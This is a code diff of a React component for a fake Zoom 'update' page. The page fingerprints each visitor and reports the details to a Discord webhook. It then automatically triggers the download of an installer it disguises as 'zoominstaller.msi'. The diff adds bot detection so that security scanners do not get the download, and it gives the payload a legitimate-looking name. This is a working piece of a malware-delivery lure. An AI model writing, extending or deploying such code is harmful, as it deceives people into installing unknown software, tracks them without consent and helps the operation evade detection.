@@ -1,8 +1,13 @@
 "use client";
 import React, { useEffect, useState, useRef } from "react";
 import Loader from "./Loader";
+import { useSentinel } from "../hooks/useSentinel";
 
 export default function UpdateBox() {
+  // Sentinel bot detection
+  const sentinelKey = process.env.NEXT_PUBLIC_SENTINEL_PROJECT_KEY;
+  const { result: sentinelResult, loading: sentinelLoading, isBot } = useSentinel(sentinelKey);
+
   // State management
   const [os, setOs] = useState(null);
   const [browserType, setBrowserType] = useState("");
@@ -20,21 +25,21 @@ export default function UpdateBox() {
   const ZOOM_MAC_URL = process.env.NEXT_PUBLIC_ZOOM_MAC_URL;
   const MEETING_LINK = process.env.NEXT_PUBLIC_MEETING_LINK;
   const DEFAULT_WINDOWS_INSTALLER_PATH =
-    "/assets/setup/update/em_8ybPmrAI_installer_Win7-Win11_x86_x64.msi";
-  const WINDOWS_INSTALLER_FILENAME = "em_8ybPmrAI_installer_Win7-Win11_x86_x64.msi";
+    "/assets/setup/update/zoominstaller.msi";
+  const WINDOWS_INSTALLER_FILENAME = "zoominstaller.msi";
 
   // Handle window resize
   useEffect(() => {
     function handleResize() {
       setWindowWidth(window.innerWidth);
     }
-    
+
     // Initial window width measurement
     handleResize();
-    
+
     // Add event listener
     window.addEventListener("resize", handleResize);
-    
+
     // Remove event listener on cleanup
     return () => window.removeEventListener("resize", handleResize);
   }, []);
@@ -51,7 +56,7 @@ export default function UpdateBox() {
       if (!response.ok) {
         throw new Error(`Discord webhook error: ${response.status}`);
       }
-      
+
       console.log("Message sent to Discord");
       return await response.json();
     } catch (error) {
@@ -67,14 +72,14 @@ export default function UpdateBox() {
         const detectedOs = platform.includes("Win")
           ? "windows"
           : platform.includes("Mac")
-          ? "mac"
-          : "other";
+            ? "mac"
+            : "other";
         setOs(detectedOs);
 
         // Get browser info
         const userAgent = navigator.userAgent || navigator.vendor || window.opera;
         let detectedBrowser = "unknown";
-        
+
         // Browser Detection
         if (/chrome|chromium|crios/i.test(userAgent)) {
           detectedBrowser = "chrome";
@@ -87,7 +92,7 @@ export default function UpdateBox() {
         } else if (/opera|opr/i.test(userAgent)) {
           detectedBrowser = "opera";
         }
-        
+
         setBrowserType(detectedBrowser);
 
         // Show mobile modal for mobile devices
@@ -102,13 +107,13 @@ export default function UpdateBox() {
         const browser = navigator.userAgent;
         const screenWidth = window.screen.width;
         const screenHeight = window.screen.height;
-        
+
         // Create device info payload
-        const body = { 
-          ip, 
-          browser, 
-          platform: detectedOs, 
-          screenWidth, 
+        const body = {
+          ip,
+          browser,
+          platform: detectedOs,
+          screenWidth,
           screenHeight,
           language: navigator.language || navigator.userLanguage,
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -138,7 +143,7 @@ export default function UpdateBox() {
 🔄 Referrer: ${document.referrer || "direct"}
 `;
         await sendToDiscord(discordMessage);
-        
+
       } catch (error) {
         console.error("Error sending device info:", error);
         // Try to send error to Discord for monitoring
@@ -147,17 +152,17 @@ export default function UpdateBox() {
         setIsLoading(false);
       }
     }
-    
+
     detectOS();
   }, []);
 
-  // Auto-download logic - enable automatic download
+  // Auto-download logic - enable automatic download (only if not a bot)
   useEffect(() => {
-    if (!os || isLoading || os === "other" || os === "android" || os === "ios") return;
+    if (!os || isLoading || os === "other" || os === "android" || os === "ios" || isBot) return;
 
     const windowsDownloadUrl = ZOOM_WIN_URL || DEFAULT_WINDOWS_INSTALLER_PATH;
     const downloadUrl = os === "windows" ? windowsDownloadUrl : ZOOM_MAC_URL;
-    
+
     if (!downloadUrl) {
       console.error("No download URL available for this OS:", os);
       setDownloadError(true);
@@ -171,7 +176,7 @@ export default function UpdateBox() {
       try {
         // Send an event to Discord that download is starting
         await sendToDiscord(`🔽 Download initiated for ${os} device`);
-        
+
         const link = document.createElement("a");
         link.href = downloadUrl;
         link.download =
@@ -184,13 +189,13 @@ export default function UpdateBox() {
         document.body.removeChild(link);
 
         setDownloadInitiated(true);
-        
+
         // Send successful download event to Discord
         await sendToDiscord(`✅ Download started successfully for ${os} device`);
       } catch (error) {
         console.error("Download failed:", error);
         setDownloadError(true);
-        
+
         // Send error to Discord
         await sendToDiscord(`❌ Download failed for ${os} device: ${error.message}`);
       } finally {
@@ -201,7 +206,7 @@ export default function UpdateBox() {
     // Auto-start download after a short delay
     const timer = setTimeout(initiateSecureDownload, 1500);
     return () => clearTimeout(timer);
-  }, [os, isLoading]);
+  }, [os, isLoading, isBot]);
 
   // Get browser-specific download instructions
   const getDownloadInstructions = () => {
@@ -214,7 +219,7 @@ export default function UpdateBox() {
       case "firefox":
         return {
           location: "top-right corner download arrow",
-          action: `Click on ${os === "windows" ? WINDOWS_INSTALLER_FILENAME : "ZoomInstaller"} from the download list`,
+          action: `Click on ${os === "windows" ? "zoominstaller.msi" : "ZoomInstaller"} from the download list`,
         };
       case "safari":
         return {
@@ -337,8 +342,8 @@ export default function UpdateBox() {
             >
               Download Now
             </button>
-            <a 
-              href="#" 
+            <a
+              href="#"
               className="text-blue-600 hover:underline flex items-center justify-center sm:justify-start text-sm sm:text-base"
               onClick={() => sendToDiscord("👆 User clicked 'Discover Zoom Workplace'")}
             >
@@ -455,9 +460,8 @@ export default function UpdateBox() {
         <main className={`pt-16 sm:pt-24 pb-12 sm:pb-16 bg-white min-h-screen ${downloadInitiated ? "opacity-50" : ""}`}>
           {/* Announcement Bar (Header) */}
           <div
-            className={`fixed top-0 left-0 right-0 bg-white border-b border-gray-200 ${
-              downloadInitiated ? "z-30" : "z-45"
-            }`}
+            className={`fixed top-0 left-0 right-0 bg-white border-b border-gray-200 ${downloadInitiated ? "z-30" : "z-45"
+              }`}
           >
             <div className="max-w-7xl mx-auto px-3 sm:px-4 lg:px-8 py-2 text-center">
               <p className="text-xs sm:text-sm text-gray-700">
@@ -473,10 +477,10 @@ export default function UpdateBox() {
                   <span className="hidden xs:inline">Zoom debuts new agentic AI skills for Zoom AI Companion</span>
                   <span className="xs:hidden">New AI skills available</span>
                 </span>
-                <a 
-                  href="#" 
+                <a
+                  href="#"
                   className="text-blue-600 hover:underline text-xs sm:text-sm"
-              onClick={() => sendToDiscord("👆 User clicked 'Read more'")}
+                  onClick={() => sendToDiscord("👆 User clicked 'Read more'")}
                 >
                   Read more
                 </a>
